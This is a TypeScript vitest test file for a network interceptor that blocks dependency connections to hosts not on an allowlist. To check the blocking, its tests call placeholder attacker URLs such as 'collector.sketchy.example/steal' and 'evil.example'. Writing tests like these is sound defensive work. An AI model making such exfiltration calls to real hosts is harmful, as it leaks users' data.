import { describe, it, expect, afterEach, beforeEach } from 'vitest';
import http from 'node:http';
import { NetInterceptor } from '../../../src/adapters/interceptors/net.interceptor.js';
import type { Disposable } from '../../../src/application/ports.js';
import { recordSpy } from './spy.js';

// Stub the real network entrypoints so no test ever opens a socket.
const HTTP_SENTINEL = { sentinel: 'http' };
const FETCH_SENTINEL = { sentinel: 'fetch' };

let installed: Disposable | undefined;
let realRequest: typeof http.request;
let realFetch: typeof globalThis.fetch | undefined;
let httpCalls: unknown[][];
let fetchCalls: unknown[][];

beforeEach(() => {
  httpCalls = [];
  fetchCalls = [];
  realRequest = http.request;
  realFetch = globalThis.fetch;
  (http as unknown as Record<string, unknown>)['request'] = (...args: unknown[]) => {
    httpCalls.push(args);
    return HTTP_SENTINEL;
  };
  (globalThis as { fetch?: unknown }).fetch = (...args: unknown[]) => {
    fetchCalls.push(args);
    return Promise.resolve(FETCH_SENTINEL);
  };
});

afterEach(() => {
  installed?.dispose();
  installed = undefined;
  (http as unknown as Record<string, unknown>)['request'] = realRequest;
  (globalThis as { fetch?: unknown }).fetch = realFetch;
});

describe('NetInterceptor — http', () => {
  it('catches a connection and extracts the URL from a string arg', () => {
    const spy = recordSpy();
    spy.deny('not allowlisted');
    installed = new NetInterceptor().install(spy.record);

    expect(() => http.request('http://collector.sketchy.example/steal')).toThrow(
      /dephawk: blocked/,
    );
    expect(spy.last?.capability).toBe('net.connect');
    expect(spy.last?.detail).toBe('http://collector.sketchy.example/steal');
    expect(httpCalls).toHaveLength(0); // original never reached
  });

  it('extracts host/path from an options object and proceeds when allowed', () => {
    const spy = recordSpy();
    installed = new NetInterceptor().install(spy.record);

    const result = http.request({ hostname: 'api.example.com', path: '/v1' });
    expect(result).toBe(HTTP_SENTINEL);
    expect(spy.last?.detail).toBe('http://api.example.com/v1');
    expect(httpCalls).toHaveLength(1);
  });
});

describe('NetInterceptor — fetch', () => {
  it('rejects a blocked fetch without calling the original', async () => {
    const spy = recordSpy();
    spy.deny('nope');
    installed = new NetInterceptor().install(spy.record);

    await expect(fetch('https://evil.example/x')).rejects.toThrow(/dephawk: blocked/);
    expect(spy.last?.detail).toBe('https://evil.example/x');
    expect(fetchCalls).toHaveLength(0);
  });

  it('passes an allowed fetch through to the original', async () => {
    const spy = recordSpy();
    installed = new NetInterceptor().install(spy.record);

    await expect(fetch('https://api.example.com/ok')).resolves.toBe(FETCH_SENTINEL);
    expect(spy.last?.detail).toBe('https://api.example.com/ok');
    expect(fetchCalls).toHaveLength(1);
  });
});

describe('NetInterceptor lifecycle', () => {
  it('restores patched entrypoints on dispose', () => {
    const patched = http.request;
    const local = new NetInterceptor().install(recordSpy().record);
    expect(http.request).not.toBe(patched);
    local.dispose();
    expect(http.request).toBe(patched);
  });
});
